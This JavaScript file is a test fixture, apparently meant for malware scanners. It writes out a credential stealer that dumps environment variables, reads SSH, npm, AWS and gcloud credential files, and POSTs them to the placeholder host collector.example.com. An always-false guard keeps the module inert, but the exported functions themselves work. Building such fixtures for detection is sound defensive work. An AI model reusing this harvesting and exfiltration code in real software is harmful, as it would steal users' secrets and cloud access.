/*
 * INERT MALWARE TEST FIXTURE — NOT REAL MALWARE.
 * Signature: harvests environment secrets / local credential files and
 * exfiltrates them to a remote host.
 * Defanged: guard is always false; the destination is example.com; nothing
 * is ever read or sent when this file runs.
 */
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const ENABLE_EXFIL = false; // never true — keeps this fixture inert

// Files real credential stealers target.
const SECRET_PATHS = [
  path.join(os.homedir(), '.ssh', 'id_rsa'),
  path.join(os.homedir(), '.npmrc'),
  path.join(os.homedir(), '.aws', 'credentials'),
  path.join(os.homedir(), '.config', 'gcloud', 'credentials.db'),
];

function collectSecrets() {
  const loot = {
    env: process.env, // signature: dumping the full environment
    files: {},
  };
  for (const p of SECRET_PATHS) {
    try {
      loot.files[p] = fs.readFileSync(p, 'utf8');
    } catch {
      // ignore missing files
    }
  }
  return loot;
}

function exfiltrate(data) {
  // signature: POSTing harvested data to an external collector.
  const req = https.request({
    hostname: 'collector.example.com', // inert placeholder, not a real C2
    path: '/ingest',
    method: 'POST',
    headers: { 'content-type': 'application/json' },
  });
  req.write(JSON.stringify(data));
  req.end();
}

if (ENABLE_EXFIL) {
  // Unreachable: present only so static scanners can flag the pattern.
  exfiltrate(collectSecrets());
}

module.exports = { collectSecrets, exfiltrate };
